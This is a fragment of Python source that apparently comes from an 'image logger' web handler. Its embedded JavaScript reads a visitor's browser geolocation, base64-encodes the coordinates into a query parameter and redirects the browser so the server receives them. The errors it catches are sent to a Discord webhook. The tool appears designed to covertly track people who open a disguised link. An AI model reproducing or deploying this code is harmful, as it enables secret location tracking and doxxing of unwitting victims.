        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
